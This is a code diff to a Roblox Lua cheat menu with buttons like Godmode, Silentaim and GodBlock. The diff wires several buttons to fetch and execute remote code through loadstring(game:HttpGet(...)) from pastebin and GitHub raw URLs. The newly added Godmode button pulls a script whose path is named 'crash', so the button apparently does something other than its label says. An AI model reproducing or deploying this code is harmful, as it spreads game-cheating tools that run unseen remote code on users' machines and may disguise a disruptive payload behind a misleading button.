@@ -28,7 +28,7 @@ local SOON_3 = Instance.new("TextButton")
 local SOON_4 = Instance.new("TextButton")
 local UIScale = Instance.new("UIScale")
 local UICorner = Instance.new("UICorner")
-localplayer = plr
+local player = plr
 
 --Properties:
 
@@ -93,9 +93,14 @@ GodMode.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
 GodMode.Position = UDim2.new(0.0156846102, 0, 0.4771429, 0)
 GodMode.Size = UDim2.new(0, 135, 0, 22)
 GodMode.Font = Enum.Font.SourceSans
-GodMode.Text = "SOON"
+GodMode.Text = "Godmode"
 GodMode.TextColor3 = Color3.fromRGB(0, 0, 0)
 GodMode.TextSize = 38.000
+GodMode.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/dhcrash_gen2/main/crash", true))()
+end)
+
+
 
 FistReach.Name = "FistReach"
 FistReach.Parent = MainAss
@@ -449,7 +454,7 @@ Aimlock.Text = "Silentaim"
 Aimlock.TextColor3 = Color3.fromRGB(0, 0, 0)
 Aimlock.TextSize = 32.000
 Aimlock.TextTransparency = 0.070
-NoclipB.MouseButton1Down:connect(function()
+Aimlock.MouseButton1Down:connect(function()
 	loadstring(game:HttpGet("https://pastebin.com/raw/ciHDtfSj"))()
 end)
 
@@ -462,7 +467,7 @@ GodBlock.Font = Enum.Font.SourceSans
 GodBlock.Text = "GodBlock"
 GodBlock.TextColor3 = Color3.fromRGB(0, 0, 0)
 GodBlock.TextSize = 38.000
-NoclipB.MouseButton1Down:connect(function()
+GodBlock.MouseButton1Down:connect(function()
 	loadstring(game:HttpGet('https://pastebin.com/raw/ztvkeCDL'))()
 end)
 
@@ -590,7 +595,6 @@ local function CTKQJ_fake_script() -- MainAss.LocalScript
 
 	local Plr = game.Players.LocalPlayer
 	
-
 	Plr:GetMouse().KeyDown:Connect(function(K)
 		if K == "k" then
 			script.Parent.Visible = true
